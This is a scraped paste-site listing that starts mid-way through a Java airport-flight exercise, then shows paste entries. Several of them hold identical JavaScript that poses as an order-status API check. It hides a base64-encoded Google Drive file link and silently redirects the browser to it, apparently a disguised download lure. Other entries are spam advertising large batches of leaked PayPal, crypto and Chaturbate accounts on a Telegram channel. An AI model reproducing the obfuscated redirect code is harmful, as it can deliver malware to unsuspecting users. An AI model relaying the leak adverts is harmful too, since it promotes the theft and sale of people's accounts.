        flights.get(from).stream().sorted().forEach(i-> System.out.println(String.format(""%d. %s"",atomicInteger.getAndIncrement(),
                i)));
    }

    public void showDirectFlightsFromTo(String from, String to) {
        if(flights.get(from).stream().filter(i->i.getTo().equals(to)).count()==0){
            System.out.println(String.format(""No flights from %s to %s"",from,to));
            return ;
        }
        flights.get(from).stream().sorted().filter(i->i.getTo().equals(to)).forEach(i-> System.out.println(String.format(""%s"", i)));
    }

    public void showDirectFlightsTo(String to) {
        flights.values().stream().flatMap(list->list.stream()).filter(i->i.getTo().equals(to)).sorted().forEach(i-> System.out.println(String.format(""%s"", i)));
    }
}
class Flight implements Comparable<Flight> {
    String from;
    String to;
    int time;
    int duration;

    public Flight(String from, String to, int time, int duration) {
        this.from = from;
        this.to = to;
        this.time = time;
        this.duration = duration;
    }

    public String getFrom() {
        return from;
    }

    public String getTo() {
        return to;
    }

    public int getTime() {
        return time;
    }

    public int getDuration() {
        return duration;
    }

    public String getActualTime(){
        LocalTime localTime = LocalTime.ofSecondOfDay(duration);
        String cutTime;
        cutTime = localTime.toString().substring(3).replace("":"",""h"").concat(""m"");
        if(duration%60==0){
            cutTime=cutTime.replace(""m"",""h00m"");
        }
        if(cutTime.startsWith(""0""))
            return cutTime.substring(1);
        return cutTime;

    }

    public String getDepartureAndArrivalTime(){
        LocalTime departureTime = LocalTime.ofSecondOfDay(time);
        LocalTime arrivalTime = LocalTime.ofSecondOfDay(time+duration);
        String deprartureTimeCut = departureTime.toString().substring(3);
        String arrivalTimeCut = arrivalTime.toString().substring(3);
        if(time%60==0){
            deprartureTimeCut=deprartureTimeCut.concat("":00"");
        }
        if((time+duration)%60==0){
            arrivalTimeCut=arrivalTimeCut.concat("":00"");
        }
        if(Integer.parseInt(arrivalTime.toString().substring(3,5))>23){
            arrivalTime = LocalTime.ofSecondOfDay(time+duration-24*60);
            arrivalTimeCut = arrivalTime.toString().substring(3)+"" +1d"";
        }
        return String.format(""%s-%s"",deprartureTimeCut,arrivalTimeCut);

    }

    @Override
    public String toString() {
        return String.format(""%s-%s %s %s"",from,to,getDepartureAndArrivalTime(),getActualTime());
    }

    @Override
    public int compareTo(Flight o) {
        return Comparator.comparing(Flight::getTo)
                .thenComparing(Flight::getTime)
                .thenComparing(Flight::getFrom)
                .compare(this,o);
    }
}
public class AirportsTest {
  public static void main(String[] args) {
    Scanner scanner = new Scanner(System.in);
    AirportGroup airports = new AirportGroup();
    int n = scanner.nextInt();
    scanner.nextLine();
    String[] codes = new String[n];
    for (int i = 0; i < n; ++i) {
      String al = scanner.nextLine();
      String[] parts = al.split("";"");
      airports.addAirport(parts[0], parts[1], parts[2], Integer.parseInt(parts[3]));
      codes[i] = parts[2];
    }
    int nn = scanner.nextInt();
    scanner.nextLine();
    for (int i = 0; i < nn; ++i) {
      String fl = scanner.nextLine();
      String[] parts = fl.split("";"");
      airports.addFlights(parts[0], parts[1], Integer.parseInt(parts[2]), Integer.parseInt(parts[3]));
    }
    int f = scanner.nextInt();
    int t = scanner.nextInt();
    String from = codes[f];
    String to = codes[t];
    System.out.printf(""===== FLIGHTS FROM %S =====\n"", from);
    airports.showFlightsFromAirport(from);
    System.out.printf(""===== DIRECT FLIGHTS FROM %S TO %S =====\n"", from, to);
    airports.showDirectFlightsFromTo(from, to);
    t += 5;
    t = t % n;
    to = codes[t];
    System.out.printf(""===== DIRECT FLIGHTS TO %S =====\n"", to);
    airports.showDirectFlightsTo(to);
  }
}
"
Tn1Nwrt7,Untitled,Xp_Isolation,JavaScript,Friday 25th of April 2025 04:05:07 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/87166/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
PbrGYPND,Crypto Accounts,Epiphemeral,JavaScript,Friday 25th of April 2025 04:02:28 AM CDT,26117 Accounts Posted On https://t.me/leakedbyeminem
xZH6sSDg,Xiaomi Miio workaround,314ma,YAML,Friday 25th of April 2025 04:01:57 AM CDT,"  - template: vacuum_clean_segment
    repeats_type: EXTERNAL
    service_call_schema:
      service: vacuum.send_command
      service_data:
        command: app_segment_clean
        entity_id: ""[[entity_id]]""
        params:
          - segments: ""[[selection]]""
            repeat: ""[[repeats]]"""
nLKjvkQC,Products.js,Xp_Isolation,JavaScript,Friday 25th of April 2025 03:49:44 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/55067/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
JZ4rACPB,PayPal with Balance,Epiphemeral,JavaScript,Friday 25th of April 2025 03:47:03 AM CDT,56699 Accounts Posted On https://t.me/leakedbyeminem
rBfEyk5i,Order.js,Xp_Isolation,JavaScript,Friday 25th of April 2025 03:34:22 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/40382/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
G0RAHfDR,Leaked Accounts - Fresh Hits,Epiphemeral,JavaScript,Friday 25th of April 2025 03:31:40 AM CDT,64201 Accounts Posted On https://t.me/leakedbyeminem
tDPiUGzb,Market.js,Xp_Isolation,JavaScript,Friday 25th of April 2025 03:19:00 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/61563/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
eGg1KPEN,Chaturbate with Tokens,Epiphemeral,JavaScript,Friday 25th of April 2025 03:16:17 AM CDT,97724 Accounts Posted On https://t.me/leakedbyeminem
hE4czKTw,Untitled,Xp_Isolation,JavaScript,Friday 25th of April 2025 03:02:57 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/78771/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
tGTSZrj3,Crypto Accounts,Epiphemeral,JavaScript,Friday 25th of April 2025 03:00:54 AM CDT,98534 Accounts Posted On https://t.me/leakedbyeminem
KU0qKVnQ,Products.js,rodrigomaise99,JavaScript,Friday 25th of April 2025 02:47:26 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/00414/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
raJ57kYA,PayPal with Balance,Epiphemeral,JavaScript,Friday 25th of April 2025 02:45:26 AM CDT,07016 Accounts Posted On https://t.me/leakedbyeminem
pwp8mCQP,Order.js,rodrigomaise99,JavaScript,Friday 25th of April 2025 02:32:03 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/33849/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
WCefnkD2,Leaked Accounts - Fresh Hits,Epiphemeral,JavaScript,Friday 25th of April 2025 02:30:03 AM CDT,93198 Accounts Posted On https://t.me/leakedbyeminem
